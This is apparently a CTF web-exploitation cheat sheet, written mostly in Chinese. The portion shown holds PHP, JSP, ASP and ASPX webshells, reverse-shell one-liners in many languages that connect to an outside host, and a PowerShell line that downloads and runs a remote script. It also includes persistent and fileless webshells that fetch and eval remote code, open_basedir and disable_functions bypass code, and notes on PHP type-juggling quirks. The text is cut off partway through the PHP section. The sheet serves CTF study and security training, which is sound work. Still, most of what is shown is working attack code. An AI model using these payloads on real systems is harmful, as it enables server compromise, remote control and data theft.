WEB CTF CheatSheet
===

Table of Contents
=================

*  [Webshell](#php-webshell)
*  [Reverse Shell](#reverse-shell)
*  [PHP Tag](#php-tag)
*  [PHP Weak Type](#php-weak-type)
*  [PHP Feature](#php-其他特性)
    * [Bypass open\_basedir](#open_basedir繞過)
    * [Bypass disable\_functions](#disable_functions繞過)
*  [Command Injection](#command-injection)
    * [Bypass Space](#空白繞過)
    * [Bypass Keyword](#keyword繞過)
    * [ImageMagick](#imagemagick)
    * [Ruby Command Executing](#ruby-command-executing)
    * [Python Command Executing](#python-command-executing)
*  [SQL Injection](#sql-injection)
    * [MySQL](#mysql)
    * [MSSQL](#mssql)
    * [Oracle](#oracle)
    * [SQLite](#sqlite)
    * [Postgresql](#postgresql)
    * [MS Access](#ms-access)
*  [LFI](#lfi)
*  [Upload](#上傳漏洞)
*  [Serialization](#反序列化)
    * [PHP Serialize](#php---serialize--unserialize)
    * [Python Pickle](#python-pickle)
    * [Ruby Deserialization](#rubyrails-deserialization)
    * [Java Serialization](#java-deserialization)
    * [.NET Serialization](#net-derserialization)
*  [SSTI / CSTI](#ssti)
    * [Flask/Jinja2](#flaskjinja2)
    * [Twig/Symfony](#twig--symfony)
    * [Thymeleaf](#thymeleaf)
    * [Freemarker](#freemarker)
    * [Golang](#golang)
    * [AngularJS](#angularjs)
    * [Vue.js](#vuejs)
    * [Python](#python)
    * [Tool](#tool)
*  [SSRF](#ssrf)
    * [Bypass](#bypass-127001)
    * [Local Expolit](#本地利用)
    * [Remote Expolit](#遠程利用)
    * [Metadata](#metadata)
    * [CRLF Injection](#crlf-injection)
    * [Finger Print](#fingerprint)
*  [XXE](#xxe)
    * [Out of Band XXE](#out-of-band-oob-xxe)
    * [Error-based XXE](#error-based-xxe)
*  [Prototype Pollution](#prototype-pollution)
*  [Frontend](#frontend)
    * [XSS](#xss)
    * [RPO](#rpo)
    * [CSS Injection](#css-injection)
    * [XS-Leaks](#xs-leaks)
    * [DOM Clobbering](#dom-clobbering)
*  [Crypto](#密碼學)
    * [PRNG](#prng)
    * [ECB mode](#ecb-mode)
    * [CBC mode](#cbc-mode)
    * [Length Extension Attack](#length-extension-attack)
*  [Others](#其它-1)
*  [Tools and Website](#tool--online-website)
    * [Information Gathering](#information-gathering)
    * [Hash Crack](#hash-crack)


# Webshell

## PHP Webshell

```php
<?php system($_GET["cmd"]); ?>
<?php system($_GET[1]); ?>
<?php system("`$_GET[1]`"); ?>
<?= system($_GET[cmd]);
<?=`$_GET[1]`;
<?php eval($_POST[cmd]);?>
<?php echo `$_GET[1]`;
<?php echo passthru($_GET['cmd']);
<?php echo shell_exec($_GET['cmd']);
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
<script language="php">system("id"); </script>

<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")

<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")

<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id

<?php @include($_FILES['u']['tmp_name']);  
// 構造 <form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data">上傳
// 把暫存檔include進來
// From: http://www.zeroplace.cn/article.asp?id=906

<?php $x=~¾¬¬º­«;$x($_GET['a']); ?>
// not backdoor (assert)
// .php?a=system("ls")

echo "{${phpinfo()}}";

echo "${system(ls)}";

echo Y2F0IGZsYWc= | base64 -d | sh
// Y2F0IGZsYWc=   =>  cat  flag

echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > shell.php
// cat shell.php
// <?php echo 'A PHP Test ';" ?>

echo ^<?php eval^($_POST['a']^); ?^> > a.php
// Windows echo導出一句話

<?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");

<?php
header('HTTP/1.1 404');
ob_start();
phpinfo();
ob_end_clean();
?>

<?php 
// 無回顯後門  
// e.g. ?pass=file_get_contents('http://kaibro.tw/test')
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>

<?=
// 沒有英數字的webshell
$💩 = '[[[[@@' ^ '("(/%-';
$💩(('@@['^'#!/')." /????");


A=fl;B=ag;cat $A$B

```

### webshell駐留記憶體

解法：restart
```php
<?php
    ignore_user_abort(true);  // 忽略連線中斷
    set_time_limit(0);  // 設定無執行時間上限
    $file = 'shell.php';
    $code = '<?php eval($_POST[a]);?>';
    while(md5(file_get_contents($file)) !== md5($code)) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>

```

### 無文件webshell

解法：restart
```php
<?php  
    unlink(__FILE__);  
    ignore_user_abort(true);  
    set_time_limit(0);  
    $remote_file = 'http://xxx/xxx.txt';  
    while($code = file_get_contents($remote_file)){  
        @eval($code);  
        sleep(5);  
    };  

?>  
```


## JSP Webshell

- 無回顯:

```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```

- 有回顯:

```
<%
if("kaibro".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
}
%>
```
- Unicode webshell:

```
<%\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006D\u0065\u0074\u0065\u0072\u0028\u0022\u0069\u0022\u0029\u0029\u003B%>
```

(效果同 `<%Runtime.getRuntime().exec(request.getParameter("i"));%>`)

- JSPX webshell:

```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
  version="1.2">
<jsp:directive.page contentType="text/html"/>
<jsp:declaration>
</jsp:declaration>
<jsp:scriptlet>
Runtime.getRuntime().exec(request.getParameter("i"));
</jsp:scriptlet>
<jsp:text>
</jsp:text>
</jsp:root>
```

- CP037 webshell:

```
Lo%C2%A7%C2%94%C2%93@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B0%7F@%C2%85%C2%95%C2%83%C2%96%C2%84%C2%89%C2%95%C2%87~%7F%C2%83%C2%97%C3%B0%C3%B3%C3%B7%7Fon%25L%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3@%C2%A7%C2%94%C2%93%C2%95%C2%A2z%C2%91%C2%A2%C2%97~%7F%C2%88%C2%A3%C2%A3%C2%97zaa%C2%91%C2%81%C2%A5%C2%81K%C2%A2%C2%A4%C2%95K%C2%83%C2%96%C2%94a%C3%91%C3%A2%C3%97a%C3%97%C2%81%C2%87%C2%85%7F%25@@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B2%7Fn%25L%C2%91%C2%A2%C2%97z%C2%84%C2%89%C2%99%C2%85%C2%83%C2%A3%C2%89%C2%A5%C2%85K%C2%97%C2%81%C2%87%C2%85@%C2%83%C2%96%C2%95%C2%A3%C2%85%C2%95%C2%A3%C3%A3%C2%A8%C2%97%C2%85~%7F%C2%A3%C2%85%C2%A7%C2%A3a%C2%88%C2%A3%C2%94%C2%93%7Fan%25L%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25La%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25L%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85K%C2%87%C2%85%C2%A3%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85M%5DK%C2%85%C2%A7%C2%85%C2%83M%C2%99%C2%85%C2%98%C2%A4%C2%85%C2%A2%C2%A3K%C2%87%C2%85%C2%A3%C3%97%C2%81%C2%99%C2%81%C2%94%C2%85%C2%A3%C2%85%C2%99M%7F%C2%89%7F%5D%5D%5E%25La%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25L%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3n%25
```

(效果同上 JSPX webshell: `Runtime.getRuntime().exec(request.getParameter("i"));`)

- EL webshell:

```
${Runtime.getRuntime().exec("touch /tmp/pwned")}
```

## ASP Webshell

```
<%eval request("kaibro")%>

<%execute request("kaibro")%>

<%ExecuteGlobal request("kaibro")%>

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

```

## ASPX Webshell

- 一般:

```
<%@ Page Language="Jscript"%><%eval(Request.Item["kaibro"],"unsafe");%>
```

- 上傳:

```
<%if (Request.Files.Count!=0){Request.Files[0].SaveAs(Server.MapPath(Request["f"]));}%>
```


# Reverse Shell

- 本機Listen Port
    - `ncat -vl 5566`

- Perl
    - `perl -e 'use Socket;$i="kaibro.tw";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- Bash
    - `bash -i >& /dev/tcp/kaibro.tw/5566 0>&1`
    - `bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
    - `0<&196;exec 196<>/dev/tcp/kaibro.tw/5566; sh <&196 >&196 2>&196`

- PHP
    - `php -r '$sock=fsockopen("kaibro.tw",5566);exec("/bin/sh -i <&3 >&3 2>&3");'`

- NC
    - `nc -e /bin/sh kaibro.tw 5566`

- Telnet
    - `mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe`

- Python
    - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- Ruby 
    - `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("kaibro.tw","5566");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

- Node.js
    - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
    - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");`

- Java
    - `Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/kaibro.tw/5278;cat <&5 | while read line; do $line 2>&5 >&5; done"});p.waitFor();`
    - `java.lang.Runtime.exec()` payload generator: http://www.jackson-t.ca/runtime-exec-payloads.html

- Powershell
    - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`

# PHP Tag

- `<? ?>`
    - short_open_tag 決定是否可使用短標記
    - 或是編譯php時 --enable-short-tags
- `<?=`
    - 等價 <? echo
    - 自`PHP 5.4.0`起，always work!
- `<% %>`、`<%=`
    - 自`PHP 7.0.0`起，被移除
    - 須將`asp_tags`設成On
- `<script language="php"`
    - 自`PHP 7.0.0`起，被移除
    - `<script language="php">system("id"); </script>`



# PHP Weak Type

- `var_dump('0xABCdef'       == '     0xABCdef');`
    * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)

- `var_dump('0010e2'         == '1e3’);`
    - true
- `strcmp([],[])`
    - 0
- `sha1([])`
    - NULL
- `'123' == 123`
- `'abc' == 0`
- `'123a' == 123`
- `'0x01' == 1`
    - PHP 7.0 後，16 進位字串不再當成數字
    - e.g `var_dump('0x01' == 1)` => false
- `'' == 0 == false == NULL`
- `md5([1,2,3]) == md5([4,5,6]) == NULL`
    - 可用在登入繞過 (用戶不存在，則 password 為 NULL)
- `var_dump(md5(240610708));`
    - 0e462097431906509019562988736854
- `var_dump(sha1(10932435112));`
    - 0e07766915004133176347055865026311692244
- `$a="123"; $b="456"`
    - `$a + $b == "579";`
    - `$a . $b == "123456"`

- `$a = 0; $b = 'x';`
    - `$a == false` => true
    - `$a == $b` => true
    - `$b == true` => true

- `$a = 'a'`
    - `++$a` => `'b'`
    - `$a+1` => `1`


# PHP 其他特性

## Overflow

- 32位元
    - `intval('1000000000000')` => `2147483647`
- 64位元
    - `intval('100000000000000000000')` => `9223372036854775807`

## 浮點數精度

- `php -r "var_dump(1.000000000000001 == 1);"`
    - false

- `php -r "var_dump(1.0000000000000001 == 1);"`
    - true

- `$a = 0.1 * 0.1; var_dump($a == 0.01);`
    - false

## ereg會被NULL截斷

- `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
    - `1`
- `ereg` 和 `eregi` 在 PHP 7.0.0 已經被移除

## intval

- 四捨五入
    - `var_dump(intval('5278.8787'));`
        - `5278`
- `intval(012)` => 10
- `intval("012")` => 12

## extract變數覆蓋

- `extract($_GET);`
    - `.php?_SESSION[name]=admin`
    - `echo $_SESSION['name']` => 'admin'

## trim

- 會把字串前後的空白(或其他字元)去掉
- 未指定第二參數，預設會去掉以下字元
    - `" "` (0x20)
    - `"\t"` (0x09)
    - `"\n"` (0x0A)
    - `"\x0B"` (0x0B)
    - `"\r"` (0x0D)
    - `"\0"` (0x00)
- 可以發現預設不包含 `"\f"` (0x0C)
    - 比較：`is_numeric()` 允許 `\f` 在開頭
- 如果參數是 unset 或空的變數，回傳值是空字串

## is_numeric

- `is_numeric(" \t\r\n 123")` => `true`

- `is_numeric(' 87')` => `true`
- `is_numeric('87 ')` => `false`
- `is_numeric(' 87 ')` => `false`
- `is_numeric('0xdeadbeef')`
    - PHP >= 7.0.0 => `false`
    - PHP < 7.0.0 => `true`
    - 可以拿來繞過注入
- 以下亦為合法(返回 True)字串:
    - `' -.0'`
    - `'0.'`
    - `' +2.1e5'`
    - `' -1.5E+25'`
    - `'1.e5'`

## in_array

- `in_array('5 or 1=1', array(1, 2, 3, 4, 5))`
    - true
- `in_array('kaibro', array(0, 1, 2))`
    - true
- `in_array(array(), array('kai'=>false))`
    - true
- `in_array(array(), array('kai'=>null))`
    - true
- `in_array(array(), array('kai'=>0))`
    - false
- `in_array(array(), array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>true))`
    - true
- `in_array('kai', array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>0))`
    - true
- `in_array('kai', array('kai'=>1))`
    - false

## array_search

- `mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])`
    - 在 `haystack` 陣列中，搜尋 `needle` 的值，成功則返回 index，失敗返回 False
- `$strict` 為 false 時，採用不嚴格比較
    - 預設是 False
- Example
    - `$arr=array(1,2,0); var_dump(array_search('kai', $arr))`
        - `int(2)`
    - `$arr=array(1,2,0); var_dump(array_search('1', $arr))`
        - `int(0)`

## parse_str
- `parse_str(string, array)`
- 會把查詢字串解析到變數中
- 如果未設置第二個參數，會解析到同名變數中
    - PHP7.2 中不設置第二個參數會產生`E_DEPRECATED`警告
- `parse_str('gg[kaibro]=5566');`

    ```
    array(1) {
      ["kaibro"]=>
        string(4) "5566"
    }

    ```
- PHP 變數有空格和`.`，會被轉成底線
    
    ```
    parse_str("na.me=kaibro&pass wd=ggininder",$test);
    var_dump($test);
    
    array(2) { 
        ["na_me"]=> string(6) "kaibro" 
        ["pass_wd"]=> string(9) "ggininder" 
    } 
    ```


## parse_url

- 在處理傳入的 URL 會有問題
- `parse_url('/a.php?id=1')`
    
    ```
    array(2) {
      ["host"]=>
        string(5) "a.php"
      ["query"]=>
        string(4) "id=1"
    }
    ```
- `parse_url('//a/b')`
    - host: `a`
- `parse_url('..//a/b/c:80')`
    - host: `..`
    - port: `80`
    - path: `//a/b/c:80`
- `parse_url('///a.php?id=1')`
    - false

- `parse_url('/a.php?id=1:80')`
     - PHP < 7.0.0
         - `false`
     - PHP >= 7.0.0
       ```
         array(2) { 
             ["path"]=> string(6) "/a.php" 
             ["query"]=> string(7) "id=1:80" 
         }
       ```

- `parse_url('http://kaibro.tw:87878')`
    - 5.3.X版本以下
        ```php
        array(3) { 
            ["scheme"]=> string(4) "http" 
            ["host"]=> string(9) "kaibro.tw" 
            ["port"]=> int(22342) 
        }
        ```
    - 其他： false

## preg_replace

- `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`
    - 搜尋 `$subject` 中匹配的 `$pattern`，並用 `$replacement` 替換
- 第一個參數用 `/e` 修飾符，`$replacement` 會被當成 PHP code 執行
    - 必須有匹配到才會執行
    - PHP 5.5.0 起，會產生 `E_DEPRECATED` 錯誤
    - PHP 7.0.0 不再支援，用 `preg_replace_callback()` 代替

example:

```php
<?php
$a='phpkaibro';
echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
```

## sprintf / vprintf

- 對格式化字串的類型沒檢查
- 格式化字串中 % 後面的字元(除了 % 之外)會被當成字串類型吃掉
    - 例如 `%\`、`%'`、`%1$\'`
    - 在某些 SQLi 過濾狀況下，`%' and 1=1#` 中的單引號會被轉義成 `\'`，`%\` 又會被吃掉，`'` 成功逃逸
    - 原理：sprintf 實作是用 switch...case...
        - 碰到未知類型，`default` 不處理

## file_put_contents

- 第二個參數如果是陣列，PHP會把它串接成字串
- example:
    ```php
    <?php
    $test = $_GET['txt'];
    if(preg_match('[<>?]', $test)) die('bye');
    file_put_contents('output', $test);
    ```
    - 可以直接`?txt[]=<?php phpinfo(); ?>`寫入

## spl_autoload_register

- `spl_autoload_register()` 可以自動載入 Class
- 不指定參數，會自動載入 `.inc` 和 `.php`
- Example:
    - 如果目錄下有 kaibro.inc，且內容為 class Kaibro{...}
    - 則 `spl_autoload_register()` 會把這個 Class 載入進來


## 路徑正規化

- `a.php/.`
    - `file_put_contents("a.php/.", "<?php phpinfo() ?>");`
        - 可成功寫入
            - 經測試 Windows 可以覆寫、Linux 無法
        - 可以繞過一些正規表達式判斷
    - `file_get_contents("a.php/.");`
        - 經測試 Windows 下可成功讀、Linux 無法
    - 還有很多其他 function 也適用
- `"` => `.`
    - `a"php`
- `>` => `?`
    - `a.p>p`
    - `a.>>>`
- `<` => `*`
    - `a.<`

## URL query decode
- `$_GET` 會對傳入的參數做 URLdecode 再返回
- `$_SERVER['REQUEST_URI']` 和 `$_SERVER['QUERY_STRING']` 則是直接返回

Example:

Request: `http://kaibro.tw/test.php?url=%67%67`
    
* $_GET: `[url] => gg`

* $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
    
* $_SERVER['QUERY_STRING']: `url=%67%67`

## OPcache

- 透過將 PHP 腳本編譯成 Byte code 的方式做 Cache 來提升性能
- 相關設定在 php.ini 中
    - `opcache.enable` 是否啟用
    - `opcache.file_cache` 設定 cache 目錄
        - 例如:`opcache.file_cache="/tmp/opcache"`
        - `/var/www/index.php` 的暫存會放在 `/tmp/opcache/[system_id]/var/www/index.php.bin`
    - `opcache.file_cache_only` 設定 cache 文件優先級
    - `opcache.validate_timestamps` 是否啟用 timestamp 驗證
- `system_id` 是透過 Zend 和 PHP 版本號計算出來的，可以確保相容性
- 所以在某些條件下可透過上傳覆蓋暫存文件來寫 webshell
    - system_id 要和目標機器一樣
    - timestamp 要一致
- https://github.com/GoSecure/php7-opcache-override
    - Disassembler 可以把 Byte code 轉成 Pseudo code

- Example
    - [0CTF 2018 Qual - EzDoor](https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor)

## PCRE回溯次數限制繞過

- PHP 的 PCRE 庫使用 NFA 作為正規表達式引擎
    - NFA 在匹配不上時，會回溯嘗試其他狀態
- PHP 為防止 DOS，設定了 PCRE 回溯次數上限
    - `pcre.backtrack_limit`
    - 預設為 `1000000`
- 回溯次數超過上限時，`preg_match()` 會返回 `false`
- Example
    - Code-Breaking Puzzles - pcrewaf
    - [N1CTF 2019 - sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/sql_manage/README.md)

## open_basedir繞過

- glob 列目錄

```php
$file_list = array();
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
    echo "{$f}<br/>";
}
```

- [phuck3](https://twitter.com/Blaklis_/status/1111586655134203904)

```php
chdir('img');
ini_set('open_basedir','..');
chdir('..');chdir('..');
chdir('..');chdir('..');
ini_set('open_basedir','/');
echo(file_get_contents('flag'));
```

- symlinks

```php
mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
symlink('/var/www/html/a/b/c/d/e/f/g','foo');
ini_set('open_basedir','/var/www/html:bar/');
symlink('foo/../../../../../../','bar');
unlink('foo');
symlink('/var/www/html/','foo');
echo file_get_contents('bar/etc/passwd');
```

- Fastcgi
    - [link](https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy)

- ...

## disable_functions繞過

- bash shellshock
- mail()
    - `sendmail`
    - putenv寫LD_PRELOAD
    - trick: [LD_PRELOAD without sendmail/getuid()](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)

- mb_send_mail()
    - 跟 mail() 基本上一樣

- imap_mail()
    - 同上

- imap_open()
    ```php
    <?php
    $payload = "echo hello|tee /tmp/executed";
    $encoded_payload = base64_encode($payload);
    $server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
    @imap_open('{'.$server.'}:143/imap}INBOX', '', '');
    ```
- error_log()
    - 第二個參數 `message_type` 為 1 時，會去調用 sendmail

- ImageMagick
    - [Command Injection](https://www.exploit-db.com/exploits/39766)
    - LD_PRELOAD + ghostscript:
        - Imagemagick 會用 ghostscript去parse `eps`
        - [Link](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload)
    - LD_PRELOAD + ffpmeg
        - [Link](https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/)
    - MAGICK_CODER_MODULE_PATH
        - > it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory
        - [Document](https://www.imagemagick.org/script/resources.php#Environment%20Variables)
        - [Link](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy)
    - MAGICK_CONFIGURE_PATH
        - `delegates.xml` 定義處理各種文件的規則
        - 可以用 putenv 寫掉設定檔路徑
        - [Link](https://xz.aliyun.com/t/4688#toc-14)

        ```xml
        <delegatemap>
        <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/output&quot;"/>
        </delegatemap>
        ```

    - 蓋`PATH` + ghostscript:
        - 造一個執行檔 gs

        ```cpp
        #include <stdlib.h>
        #include <string.h>
        int main() {
            unsetenv("PATH");
            const char* cmd = getenv("CMD");
            system(cmd);
            return 0;
        }
        ```

        ```php
        putenv('PATH=/tmp/mydir');
        putenv('CMD=/readflag > /tmp/mydir/output');
        chmod('/tmp/mydir/gs','0777');
        $img = new Imagick('/tmp/mydir/1.ept');
        ```
- dl()
    - 載入 module
    - `dl("rce.so")`
    - This function was removed from most SAPIs in PHP 5.3.0, and was removed from PHP-FPM in PHP 7.0.0.

- FFI
    - PHP 7.4 feature
    - preloading + ffi
    - e.g. [RCTF 2019 - nextphp](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp)

    ```php
    <?php
    $ffi = FFI::cdef("int system (const char* command);");
    $ffi->system("id");
    ```

- [FastCGI Extension](https://github.com/w181496/FuckFastcgi)

- Windows COM
    - 條件
        - `com.allow_dcom = true`
        - `extension=php_com_dotnet.dll`
    - PoC:

    ```php
    <?php
    $command = $_GET['cmd'];
    $wsh = new COM('WScript.shell'); // Shell.Application 也可
    $exec = $wsh->exec("cmd /c".$command);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
    ```

- iconv
    - https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80
    - 條件
        - 可以上傳 `.so`, `gconv-modules`
        - 可以設定環境變數
    - `iconv()`, `iconv_strlen()`, php://filter的`convert.iconv`

- [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)

- [JSON UAF Bypass](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
    - 7.1 - all versions to date
    - 7.2 < 7.2.19 (released: 30 May 2019)
    - 7.3 < 7.3.6 (released: 30 May 2019)
- [GC Bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)
    - 7.0 - all versions to date
    - 7.1 - all versions to date
    - 7.2 - all versions to date
    - 7.3 - all versions to date

- [Backtrace Bypass](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)
    - 7.0 - all versions to date
    - 7.1 - all versions to date
    - 7.2 - all versions to date
    - 7.3 - all versions to date
    - 7.4 - all versions to date

- PHP SplDoublyLinkedList UAF Sandbox Escape
    - https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/
    - Affected
        - PHP version 8.0 (alpha)
        - PHP version 7.4.10 and prior (probably also future versions will be affected)
    - Example
        - [RealWorld CTF 3rd - MoP2021](https://github.com/w181496/CTF/tree/master/RealWorldCTF2021/MoP2021)

- 族繁不及備載......        

## 其他

- 大小寫不敏感
    - `<?PhP sYstEm(ls);`
- `echo (true ? 'a' : false ? 'b' : 'c');`
    - `b`
- ```echo `whoami`; ```
    - `kaibro`
- 正規表達式 `.` 不匹配換行字元 `%0a`
- 正規表達式常見誤用:
    - `preg_match("/\\/", $str)`
    - 匹配反斜線應該要用 `\\\\` 而不是 `\\`
- 運算優先權問題
    - `$a = true && false;`
        - `$a` => `false`
    - `$a = true and false;`
        - `$a` => `true`
- chr()
    - 大於 256 會 mod 256
    - 小於 0 會加上 256 的倍數，直到 >0
    - Example:
        - `chr(259) === chr(3)`
        - `chr(-87) === chr(169)`

- 遞增
    - `$a="9D9"; var_dump(++$a);`
        - `string(3) "9E0"`
    - `$a="9E0"; var_dump(++$a);`
        - `float(10)`

- 算數運算繞Filter
    - `%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f`
        - `system`
        - 可用在限制不能出現英數字時 or 過濾某些特殊符號
    - ```$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');```
        - `assert`
    - 其他
        - `~`, `++`等運算，也都可用類似概念構造

- 花括號
    - 陣列、字串元素存取可用花括號
    - `$array{index}` 同 `$array[index]`

- filter_var
    - `filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)`
        - False
    - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
        - True
    - ```filter_var('"aaaaa{}[]()\'|!#$%*&^-_=+`,."@b.c',FILTER_VALIDATE_EMAIL) ```
        - `"aaaaa{}[]()'|!#$%*&^-_=+`,."@b.c` (OK)
    - `filter_var('aaa."bbb"@b.c',FILTER_VALIDATE_EMAIL)`
        - `aaa."bbb"@b.c` (OK)
    - `filter_var('aaa"bbb"@b.c',FILTER_VALIDATE_EMAIL)`
        - False

- json_decode
    - 不直接吃換行字元和 \t 字元
    - 但可以吃 '\n' 和 '\t'
        - 會轉成換行字元和 Tab
    - 也吃`\uxxxx`形式
        - `json_decode('{"a":"\u0041"}')`


- === bug
    - `var_dump([0 => 0] === [0x100000000 => 0])`
        - 某些版本會是 True
        - ASIS 2018 Qual Nice Code
    - https://3v4l.org/sUEMG
- openssl_verify
    - 預測採用 SHA1 來做簽名，可能有 SHA1 Collision 問題
    - e.g. [DEFCON CTF 2018 Qual - EasyPisy](https://github.com/w181496/CTF/tree/master/defcon2018-qual/EasyPisy)
- Namespace
    - PHP 的預設 Global space 是 `\`
    - e.g. `\system('ls');`

- basename (php bug 62119)
    - `basename("index.php/config.php/喵")`
        - `config.php`
    - Example: [zer0pts CTF 2020 - Can you guess it?](https://github.com/w181496/CTF/tree/master/zer0pts2020/can_you_guess_it)

- strip_tags (php bug 78814)
    - php version <= 7.4.0
    - `strip_tags("<s/trong>b</strong>", "<strong>")`
        - `<s/trong>b</strong>`
    - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog)

- mb_strpos / mb_substr
    - 當 `mb_strpos` 讀到 utf-8 leading byte ，他會繼續嘗試往下讀; 遇到 invalid byte 時，前面的內容會被當成一個 character
        - Example: `mb_strpos("\xf0\x9fAAA<BB", '<')` -> `4` 
    - 而 `mb_substr` 則有不一致，當遇到 leading byte 時，會跳過 continuation bytes
        - Example: `mb_substr("\xf0\x9fAAA<BB", 0, 4)` -> `"\xf0\x9fAAA<B"`
    - ref: [Joomla XSS](https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/)
- Reflection
    - PHP8.1 Reflection 可以呼叫 protected/private 函數
    ```php
    <?php
    class ApiController
    {
        protected function protectedMethod() {
            echo "protected";
        }

        public function handle($method)
        {
            $refMethod = new ReflectionMethod($this, $method);
            $refMethod->invoke($this);
        }
    }

    $api = new ApiController();
    $api->handle('protectedMethod');
    
    # php 8.1+: protected
